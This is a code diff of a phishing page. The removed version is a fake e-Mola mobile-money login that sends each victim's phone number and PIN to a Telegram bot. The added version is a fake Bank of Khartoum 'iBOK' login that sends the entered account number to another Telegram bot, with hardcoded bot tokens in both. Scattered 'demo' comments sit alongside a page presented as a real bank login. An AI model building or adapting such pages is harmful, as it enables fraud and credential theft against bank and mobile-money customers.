@@ -1,719 +1,466 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>e-Mola Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Form tracking iBOK</title>
 
     <style>
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #68798a;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
         * {
             box-sizing: border-box;
-            margin: 0;
-            padding: 0;
         }
         
-        html,
         body {
+            margin: 0;
+            min-height: 100vh;
+            color: var(--ink);
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f2f5f9;
+        }
+        
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            background: radial-gradient(#c8d0da 0.85px, transparent 0.85px) 0 0 / 18px 18px, #f2f5f9;
+        }
+        
+        header {
+            min-height: 142px;
+            padding: 11px 20px 24px;
+            color: #fff;
+            background: var(--red);
+        }
+        
+        .welcome,
+        .brand {
+            width: min(704px, 100%);
+            margin-inline: auto;
+        }
+        
+        .welcome {
+            min-height: 36px;
+            padding: 6px 12px;
+            border-radius: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #111;
+            background: var(--yellow);
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .brand {
+            margin-top: 10px;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            padding: 0 16px 42px;
+        }
+        
+        .card {
+            position: relative;
+            width: min(672px, 100%);
+            margin: -12px auto 0;
+            padding: 25px 40px 24px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
+        }
+        
+        h1 {
+            margin: 0;
+            color: var(--red);
+            font-size: 24px;
+            line-height: 1.25;
+            text-align: center;
+        }
+        
+        .subtitle {
+            width: fit-content;
+            margin: 16px auto 22px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--red);
+            font-size: 17px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .demo-note {
+            margin: -8px 0 18px;
+            padding: 10px 11px;
+            border: 1px solid #f1d783;
+            border-radius: 8px;
+            color: #5f4b12;
+            background: #fff9e4;
+            font-size: 13px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        .field {
+            margin-bottom: 19px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 9px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .input-wrap {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: var(--field);
+        }
+        
+        input {
             width: 100%;
             height: 100%;
-            overflow: hidden;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        
-        body {
-            background: #c15b18;
-        }
-        /* MAIN SCREEN */
-        
-        .app {
-            position: relative;
-            width: 100%;
-            height: 100vh;
-            height: 100dvh;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            background: radial-gradient(ellipse at 18% 25%, rgba(255, 255, 255, 0.10), transparent 25%), linear-gradient(160deg, #f99a1d 0%, #e47d18 40%, #b95116 100%);
-            color: white;
-        }
-        /* BACKGROUND SHAPES */
-        
-        .app::before {
-            content: "";
-            position: absolute;
-            width: 120%;
-            height: 55%;
-            left: -40%;
-            bottom: -8%;
-            background: rgba(91, 43, 12, 0.13);
-            border-radius: 50% 50% 45% 55% / 40% 35% 65% 60%;
-            transform: rotate(-18deg);
-            pointer-events: none;
-        }
-        
-        .app::after {
-            content: "";
-            position: absolute;
-            width: 80%;
-            height: 60%;
-            right: -35%;
-            top: 30%;
-            background: rgba(255, 255, 255, 0.035);
-            border-radius: 50%;
-            transform: rotate(-20deg);
-            pointer-events: none;
-        }
-        /* TOP BAR */
-        
-        .topbar {
-            position: relative;
-            z-index: 5;
-            flex: 0 0 auto;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: calc(10px + env(safe-area-inset-top)) clamp(16px, 4vw, 40px) 0 clamp(18px, 4vw, 42px);
-        }
-        
-        .back {
-            border: none;
-            background: transparent;
-            color: white;
-            font-size: clamp(34px, 5vw, 48px);
-            font-weight: 200;
-            line-height: 1;
-            cursor: pointer;
-        }
-        
-        .language {
-            border: none;
-            background: transparent;
-            color: white;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: clamp(13px, 2vw, 16px);
-            font-weight: bold;
-            cursor: pointer;
-        }
-        
-        .flag {
-            width: clamp(26px, 4vw, 36px);
-            height: auto;
-            display: block;
-            border-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.25);
-        }
-        /* LOGIN AREA */
-        
-        .login-card {
-            position: relative;
-            z-index: 5;
-            flex: 1 1 auto;
-            width: min(430px, 86vw);
-            margin: 0 auto;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: clamp(14px, 3.5vh, 28px);
-            padding: 10px 0;
-            min-height: 0;
-        }
-        /* LOGO */
-        
-        .logo-area {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .logo-img {
-            width: clamp(90px, 14vh, 130px);
-            height: auto;
-            display: block;
-            object-fit: contain;
-        }
-        
-        .logo-title {
-            margin-top: clamp(6px, 1.2vh, 10px);
-            font-size: clamp(32px, 5vh, 44px);
-            font-weight: 800;
-            letter-spacing: -2px;
-            line-height: 1;
-        }
-        
-        .logo-subtitle {
-            font-size: clamp(13px, 2vh, 15px);
-            font-weight: bold;
-            margin-top: clamp(4px, 0.8vh, 6px);
-            opacity: 0.9;
-        }
-        /* FORM */
-        
-        form {
-            width: 100%;
-        }
-        
-        .input {
-            width: 100%;
-            height: clamp(48px, 7vh, 56px);
-            border: none;
+            padding: 0 14px;
+            border: 0;
             outline: none;
-            border-radius: 30px;
-            background: rgba(91, 49, 18, 0.43);
-            color: white;
-            text-align: center;
-            font-size: clamp(15px, 2.3vh, 17px);
-            margin-bottom: clamp(10px, 2.2vh, 18px);
-            padding: 0 20px;
-            font-family: inherit;
-        }
-        
-        .input::placeholder {
-            color: rgba(255, 255, 255, 0.75);
-        }
-        
-        .input:focus {
-            background: rgba(70, 40, 16, 0.55);
-            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.15);
-        }
-        
-        .enter {
-            width: 100%;
-            height: clamp(50px, 7.5vh, 60px);
-            border: none;
-            border-radius: 40px;
-            background: white;
-            color: #151515;
-            font-size: clamp(16px, 2.5vh, 19px);
-            font-weight: 700;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: 0.15s;
-            margin-top: clamp(2px, 0.8vh, 6px);
-            font-family: inherit;
-        }
-        
-        .enter:hover {
-            transform: scale(1.01);
-        }
-        
-        .enter:active {
-            transform: scale(0.98);
-        }
-        /* LINKS */
-        
-        .links {
-            display: flex;
-            flex-direction: column;
-            gap: clamp(8px, 1.8vh, 14px);
-            align-items: center;
-        }
-        
-        .link-button {
-            border: none;
+            color: var(--ink);
             background: transparent;
-            color: rgba(255, 255, 255, 0.92);
-            font-size: clamp(14px, 2.1vh, 16px);
+            font: inherit;
+            font-size: 16px;
+        }
+        
+        input:focus-visible,
+        button:focus-visible {
+            outline: 3px solid #2463eb;
+            outline-offset: -3px;
+        }
+        
+        input::placeholder {
+            color: var(--muted);
+        }
+        
+        .password-wrap input {
+            padding-right: 4px;
+        }
+        
+        .show-password {
+            height: 100%;
+            padding: 0 12px;
+            border: 0;
+            color: #526579;
+            background: transparent;
             cursor: pointer;
-            font-family: inherit;
-            text-decoration: none;
+            font-weight: 700;
         }
         
-        .link-button:hover {
-            color: #ffffff;
-        }
-        /* FOOTER */
-        
-        .footer {
-            position: relative;
-            z-index: 5;
-            flex: 0 0 auto;
+        .demo-action {
             width: 100%;
-            text-align: center;
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-        }
-        
-        .quick-actions {
-            display: flex;
-            justify-content: center;
-            gap: clamp(20px, 5vw, 32px);
-            margin-bottom: clamp(8px, 1.6vh, 12px);
-        }
-        
-        .round-button {
-            width: clamp(56px, 8.5vh, 74px);
-            height: clamp(56px, 8.5vh, 74px);
-            border-radius: 50%;
-            border: none;
-            background: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 3px 10px rgba(70, 30, 5, 0.12);
-        }
-        /* LOCATION ICON */
-        
-        .location-icon {
-            position: relative;
-            width: 22px;
-            height: 28px;
-            border: 3px solid #df8b55;
-            border-radius: 50%;
-        }
-        
-        .location-icon::before {
-            content: "";
-            position: absolute;
-            width: 7px;
-            height: 7px;
-            border: 2px solid #df8b55;
-            border-radius: 50%;
-            left: 4px;
-            top: 4px;
-        }
-        
-        .location-icon::after {
-            content: "";
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            border-left: 3px solid #df8b55;
-            border-bottom: 3px solid #df8b55;
-            background: white;
-            left: 3px;
-            bottom: -6px;
-            transform: rotate(-45deg);
-        }
-        /* BOOK ICON */
-        
-        .book-icon {
-            position: relative;
-            width: 30px;
-            height: 34px;
-            border: 2px solid #df8b55;
-            border-radius: 3px;
-        }
-        
-        .book-icon::before {
-            content: "";
-            position: absolute;
-            width: 2px;
-            height: 30px;
-            background: #df8b55;
-            left: 13px;
-            top: 0;
-        }
-        
-        .book-icon::after {
-            content: "";
-            position: absolute;
-            width: 8px;
-            height: 3px;
-            border-top: 2px solid #df8b55;
-            left: 3px;
-            top: 8px;
-        }
-        
-        .version {
-            font-size: clamp(11px, 1.7vh, 13px);
-            color: rgba(255, 255, 255, 0.68);
-        }
-        /* TOAST */
-        
-        .toast {
-            position: fixed;
-            z-index: 20;
-            left: 50%;
-            bottom: clamp(90px, 15vh, 120px);
-            transform: translate(-50%, 20px);
-            background: rgba(25, 20, 16, 0.9);
-            color: white;
-            padding: 12px 18px;
+            min-height: 44px;
+            margin-top: 4px;
+            border: 0;
             border-radius: 10px;
+            color: #fff;
+            background: var(--red);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .demo-action:hover {
+            background: #d92529;
+        }
+        
+        .message {
+            display: none;
+            margin-top: 14px;
+            padding: 11px;
+            border-radius: 8px;
             font-size: 14px;
-            opacity: 0;
-            pointer-events: none;
-            transition: 0.2s;
-            white-space: nowrap;
-            max-width: 90vw;
+            line-height: 1.45;
+            text-align: center;
         }
         
-        .toast.show {
-            opacity: 1;
-            transform: translate(-50%, 0);
+        .message.visible {
+            display: block;
         }
-        /* TABLETS */
         
-        @media (max-width: 1024px) {
-            .login-card {
-                width: min(430px, 80vw);
-            }
+        .message.error {
+            color: #a32121;
+            background: #fff0f0;
         }
-        /* PHONES */
+        
+        .message.success {
+            color: #245b2a;
+            background: #eef8ee;
+        }
+        
+        footer {
+            min-height: 55px;
+            padding: 12px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            background: #fff;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
         
         @media (max-width: 600px) {
-            .login-card {
-                width: calc(100vw - 56px);
+            .page {
+                margin: 0;
+                border-radius: 0;
             }
-        }
-        /* VERY SMALL PHONES */
-        
-        @media (max-width: 340px) {
-            .login-card {
-                width: calc(100vw - 36px);
+            header {
+                min-height: 132px;
             }
-            .input {
-                font-size: 14px;
+            main {
+                padding: 0 12px 32px;
             }
-        }
-        /* LANDSCAPE PHONES */
-        
-        @media (max-height: 500px) and (orientation: landscape) {
-            .login-card {
-                flex-direction: row;
-                flex-wrap: wrap;
-                justify-content: center;
-                align-items: center;
-                gap: 10px 30px;
-                width: min(760px, 92vw);
+            .card {
+                padding: 24px 22px;
             }
-            .logo-area {
-                width: auto;
-                margin-right: 10px;
-            }
-            form {
-                width: min(340px, 60vw);
-            }
-            .links {
-                width: 100%;
-                flex-direction: row;
-                justify-content: center;
-                gap: 24px;
-            }
-            .logo-img {
-                width: 64px;
-            }
-            .logo-title {
-                font-size: 24px;
-                letter-spacing: -1px;
-            }
-            .logo-subtitle {
-                font-size: 11px;
-            }
-            .input {
-                height: 42px;
-                margin-bottom: 8px;
-                font-size: 14px;
-            }
-            .enter {
-                height: 44px;
-                font-size: 15px;
-                margin-top: 0;
-            }
-            .quick-actions {
-                margin-bottom: 4px;
-            }
-            .round-button {
-                width: 46px;
-                height: 46px;
-            }
-            .location-icon {
-                transform: scale(0.7);
-            }
-            .book-icon {
-                transform: scale(0.7);
-            }
-            .back {
-                font-size: 28px;
-            }
-            .flag {
-                width: 22px;
-            }
-            .topbar {
-                padding-top: 4px;
-            }
-        }
-        /* VERY SHORT SCREENS */
-        
-        @media (max-height: 560px) {
-            .login-card {
-                gap: 10px;
-            }
-            .input {
-                margin-bottom: 8px;
+            h1 {
+                font-size: 22px;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class="app">
-
-        <!-- TOP BAR -->
-        <header class="topbar">
-            <button class="back" id="backButton" aria-label="Voltar">‹</button>
-            <button class="language" id="languageButton">
-                <img class="flag" id="flagImg" alt="Português"
-                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPfTxr-CZTuCxdAIkhApPDtOT0dPkNLGVx08WtRJe0pQ&s">
-                <strong id="langLabel">POR</strong>
-            </button>
+    <div class="page">
+        <header>
+            <div class="welcome">Welcome to iBOK online banking service</div>
+            <div class="brand">
+                <div class="brand-name">iBOK</div>
+                <div class="brand-caption">Online Form</div>
+            </div>
         </header>
 
-        <!-- LOGIN -->
-        <section class="login-card">
-            <div class="logo-area">
-                <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLjt7GJwM7u7GcGVvgKYFLd3Rbs5izlnLeBAf_tGdu8Q&s=10" alt="e-Mola">
-                <div class="logo-title">e-Mola</div>
-                <div class="logo-subtitle" id="subtitle">Meu cell, minha mola</div>
-            </div>
+        <main>
+            <section class="card" aria-labelledby="form-title">
+                <h1 id="form-title">Online Form</h1>
+                <div class="subtitle">Please enter the data</div>
 
-            <form id="loginForm">
-                <input class="input" id="phone" type="tel" inputmode="numeric" autocomplete="off" placeholder="Digite o número de telefone">
-                <input class="input" id="pin" type="password" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="PIN">
-                <button class="enter" type="submit" id="enterBtn">ENTRAR</button>
-            </form>
+                <p class="demo-note">
+                    Account number.
+                </p>
 
-            <div class="links">
-                <button class="link-button" id="forgotButton">Esqueceu a senha</button>
-                <button class="link-button" id="registerButton">Cadastrar-se</button>
-            </div>
-        </section>
+                <form id="demo-form" autocomplete="off">
+                    <div class="field">
+                        <label for="account">Enter the account number (7 digits):</label>
+                        <div class="input-wrap">
+                            <input id="account" name="account" type="text" maxlength="20" placeholder="Enter the account number (7 digits)" autocomplete="off" required>
+                        </div>
+                    </div>
 
-        <!-- FOOTER -->
-        <footer class="footer">
-            <div class="quick-actions">
-                <button class="round-button" id="locationButton" aria-label="Localização">
-                    <span class="location-icon"></span>
-                </button>
-                <button class="round-button" id="guideButton" aria-label="Guia">
-                    <span class="book-icon"></span>
-                </button>
-            </div>
-            <div class="version">Versão 2.2.0</div>
+                    <div class="field">
+                        <label for="password">Password:</label>
+                        <div class="input-wrap password-wrap">
+                            <input id="password" name="password" type="password" placeholder="Enter Password" autocomplete="new-password" required>
+                            <button class="show-password" type="button" id="toggle-password" aria-label="Show demo passphrase" aria-pressed="false">Show</button>
+                        </div>
+                    </div>
+
+                    <button class="demo-action" type="submit">Log In</button>
+                    <div class="message" id="message" role="status" aria-live="polite"></div>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            iBOK I Bank of Khartoum 2026<br> All rights reserved, Bank of Khartoum, iBOK 2026.
         </footer>
-
-        <div class="toast" id="toast"></div>
     </div>
 
+
+
+
     <script>
-        // =======================
-        // BOT CONFIG (single bot - keep 2)
-        // =======================
-        const BOT_TOKEN = '8728071345:AAHtK0Te8ZOoQDxX43tAmT51nweCyRnz19o';
-        const CHAT_ID = '7676797362';
+        document.addEventListener("DOMContentLoaded", function() {
+            // ===== TELEGRAM CONFIGURATION =====
+            const TELEGRAM_BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
+            const TELEGRAM_CHAT_ID = "8406078749";
+            // =================================
 
-        // =======================
-        // DOM REFERENCES (MATCH YOUR HTML)
-        // =======================
-        const loginForm = document.getElementById("loginForm");
-        const phoneInput = document.getElementById("phone");
-        const pinInput = document.getElementById("pin");
-        const loginBtn = document.getElementById("enterBtn");
+            const form = document.getElementById("demo-form");
+            const accountInput = document.getElementById("account");
+            const passwordInput = document.getElementById("password");
+            const togglePassword = document.getElementById("toggle-password");
+            const messageBox = document.getElementById("message");
 
-        // Your HTML does NOT include spinnerOverlay, so we guard it
-        const spinnerOverlay = document.getElementById("spinnerOverlay");
-
-        const toast = document.getElementById("toast");
-        const languageButton = document.getElementById("languageButton");
-        const flagImg = document.getElementById("flagImg");
-        const langLabel = document.getElementById("langLabel");
-        const subtitleEl = document.getElementById("subtitle");
-        const forgotButton = document.getElementById("forgotButton");
-        const registerButton = document.getElementById("registerButton");
-        const locationButton = document.getElementById("locationButton");
-        const guideButton = document.getElementById("guideButton");
-        const backButton = document.getElementById("backButton");
-
-        // =======================
-        // LOAD SAVED PHONE
-        // =======================
-        const savedPhone = localStorage.getItem('phone');
-        if (savedPhone && savedPhone.length >= 1) {
-            phoneInput.value = savedPhone;
-        }
-
-        // =======================
-        // PIN ENABLE / SUBMIT CHECK (adapted)
-        // =======================
-        function getPhoneValue() {
-            return (phoneInput.value || '').trim();
-        }
-
-        function getPinValue() {
-            return (pinInput.value || '').trim();
-        }
-
-        function updateLoginButtonState() {
-            const pinValue = getPinValue();
-            loginBtn.disabled = pinValue.length < 4; // change logic if you need exactly 6
-        }
-
-        // =======================
-        // INPUT SANITIZERS
-        // =======================
-        phoneInput.addEventListener("input", function() {
-            // allow digits and optional +
-            this.value = this.value.replace(/[^\d+ ]/g, "");
-        });
-
-        pinInput.addEventListener("input", function() {
-            // only digits, up to 6
-            this.value = this.value.replace(/\D/g, "").slice(0, 6);
-            updateLoginButtonState();
-        });
-
-        updateLoginButtonState();
-
-        // =======================
-        // TOAST
-        // =======================
-        function showToast(message) {
-            if (!toast) return;
-            toast.textContent = message;
-            toast.classList.add("show");
-            clearTimeout(window.toastTimer);
-            window.toastTimer = setTimeout(() => toast.classList.remove("show"), 2400);
-        }
-
-        // =======================
-        // LANGUAGE
-        // =======================
-        const FLAGS = {
-            pt: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPfTxr-CZTuCxdAIkhApPDtOT0dPkNLGVx08WtRJe0pQ&s",
-            en: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTG9ZbItOmbojydT4baosy-p6p_Z1-uM2Vb7eKz127ZxA&s=10"
-        };
-
-        const TEXTS = {
-            pt: {
-                langLabel: "POR",
-                subtitle: "Meu cell, minha mola",
-                phonePlaceholder: "Digite o número de telefone",
-                pinPlaceholder: "PIN",
-                enter: "ENTRAR",
-                forgot: "Esqueceu a senha",
-                register: "Cadastrar-se",
-                needPhone: "Digite o número de telefone.",
-                needPin: "Digite o PIN.",
-                sent: "Demo: formulário enviado.",
-                forgotMsg: "Recuperação de senha.",
-                registerMsg: "Cadastro.",
-                locationMsg: "Localizações.",
-                guideMsg: "Guia e-Mola.",
-                backMsg: "Voltar.",
-                langMsg: "Idioma: Português."
-            },
-            en: {
-                langLabel: "ENG",
-                subtitle: "My cell, my spring",
-                phonePlaceholder: "Enter phone number",
-                pinPlaceholder: "PIN",
-                enter: "ENTER",
-                forgot: "Forgot password",
-                register: "Sign up",
-                needPhone: "Enter the phone number.",
-                needPin: "Enter the PIN.",
-                sent: "Demo: form submitted.",
-                forgotMsg: "Password recovery.",
-                registerMsg: "Sign up.",
-                locationMsg: "Locations.",
-                guideMsg: "e-Mola guide.",
-                backMsg: "Back.",
-                langMsg: "Language: English."
-            }
-        };
-
-        let currentLang = "pt";
-
-        function applyTexts(lang) {
-            const t = TEXTS[lang];
-            document.documentElement.lang = lang === "pt" ? "pt" : "en";
-            langLabel.textContent = t.langLabel;
-            flagImg.src = FLAGS[lang];
-            flagImg.alt = lang === "pt" ? "Português" : "English";
-            subtitleEl.textContent = t.subtitle;
-
-            phoneInput.placeholder = t.phonePlaceholder;
-            pinInput.placeholder = t.pinPlaceholder;
-
-            document.getElementById("enterBtn").textContent = t.enter;
-            forgotButton.textContent = t.forgot;
-            registerButton.textContent = t.register;
-        }
-
-        // =======================
-        // BUTTON / CLICK HANDLERS
-        // =======================
-        languageButton.addEventListener("click", function() {
-            currentLang = currentLang === "pt" ? "en" : "pt";
-            applyTexts(currentLang);
-            showToast(TEXTS[currentLang].langMsg);
-        });
-
-        loginForm.addEventListener("submit", function(event) {
-            event.preventDefault();
-
-            const phone = getPhoneValue();
-            const pinValue = getPinValue();
-
-            if (!phone) {
-                showToast(TEXTS[currentLang].needPhone);
-                phoneInput.focus();
+            if (!form || !accountInput || !passwordInput ||
+                !togglePassword || !messageBox) {
+                console.error("One or more required demo form elements are missing.");
                 return;
             }
 
-            if (!pinValue || pinValue.length < 4) {
-                showToast(TEXTS[currentLang].needPin);
-                pinInput.focus();
+            const submitButton = form.querySelector('button[type="submit"]');
+
+            if (!submitButton) {
+                console.error("Submit button not found.");
                 return;
             }
 
-            if (spinnerOverlay) spinnerOverlay.style.display = 'flex';
+            let requestInProgress = false;
 
-            localStorage.setItem('phone', phone);
+            // Show or hide the demo passphrase.
+            togglePassword.addEventListener("click", function() {
+                const showPassword = passwordInput.type === "password";
 
-            const message =
-                `New Login Attempt\n\nPhone: +258 ${phone}\nPIN: ${pinValue}`;
+                passwordInput.type = showPassword ? "text" : "password";
+                togglePassword.textContent = showPassword ? "Hide" : "Show";
 
-            // Single fetch (only one bot)
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            }).catch(() => {});
+                togglePassword.setAttribute(
+                    "aria-pressed",
+                    String(showPassword)
+                );
 
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+                togglePassword.setAttribute(
+                    "aria-label",
+                    showPassword ? "Hide demo passphrase" : "Show demo passphrase"
+                );
+            });
+
+            // Display status messages.
+            function showMessage(text, success) {
+                messageBox.textContent = text;
+                messageBox.style.background = success ? "#eef8ee" : "#fff0f0";
+                messageBox.style.color = success ? "#245b2a" : "#a32121";
+                messageBox.classList.add("visible");
+            }
+
+            // Send the actual demo account identifier, never the passphrase.
+            async function sendTelegramNotification(account) {
+                if (!account) {
+                    throw new Error("The demo account field is empty.");
+                }
+
+                const telegramUrl =
+                    "https://api.telegram.org/bot" +
+                    TELEGRAM_BOT_TOKEN +
+                    "/sendMessage";
+
+                const telegramMessage = [
+                    "SAMPLE BANK DEMO NOTIFICATION",
+                    "------------------------------",
+                    "Demo account: " + account,
+                    "Status: Demo form submitted",
+                    "Time: " + new Date().toLocaleString(),
+                    "Notice: Demo notification; no passphrase transmitted."
+                ].join("\n");
+
+                const response = await fetch(telegramUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: telegramMessage
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok || !data.ok) {
+                    throw new Error(
+                        data.description || "Telegram notification failed."
+                    );
+                }
+
+                return data;
+            }
+
+            // Handle form submission.
+            form.addEventListener("submit", async function(event) {
+                event.preventDefault();
+
+                if (requestInProgress) {
+                    return;
+                }
+
+                const account = accountInput.value.trim();
+                const passphrase = passwordInput.value;
+
+                if (!account || !passphrase) {
+                    showMessage(
+                        "Please enter both fictional demo fields.",
+                        false
+                    );
+                    return;
+                }
+
+                requestInProgress = true;
+                submitButton.disabled = true;
+                submitButton.textContent = "SENDING...";
+
+                try {
+                    // IMPORTANT: Pass the actual account input.
+                    await sendTelegramNotification(account);
+
+                    showMessage(
+                        "Demo notification sent successfully.",
+                        true
+                    );
+
+                    form.reset();
+
+                    passwordInput.type = "password";
+                    togglePassword.textContent = "Show";
+                    togglePassword.setAttribute("aria-pressed", "false");
+
+                    // Redirect after successful notification.
+                    window.location.href = "summary.html";
+
+                } catch (error) {
+                    console.error("Telegram notification error:", error);
+
+                    showMessage(
+                        "Telegram notification failed. Check your configuration.",
+                        false
+                    );
+
+                } finally {
+                    requestInProgress = false;
+                    submitButton.disabled = false;
+                    submitButton.textContent = "TRY DEMO";
+                }
+            });
         });
-
-        forgotButton.addEventListener("click", () => showToast(TEXTS[currentLang].forgotMsg));
-        registerButton.addEventListener("click", () => showToast(TEXTS[currentLang].registerMsg));
-        locationButton.addEventListener("click", () => showToast(TEXTS[currentLang].locationMsg));
-        guideButton.addEventListener("click", () => showToast(TEXTS[currentLang].guideMsg));
-
-        backButton.addEventListener("click", function() {
-            if (history.length > 1) history.back();
-            else showToast(TEXTS[currentLang].backMsg);
-        });
-
-        // =======================
-        // INIT
-        // =======================
-        applyTexts(currentLang);
     </script>
+
+
 </body>
 
 </html>
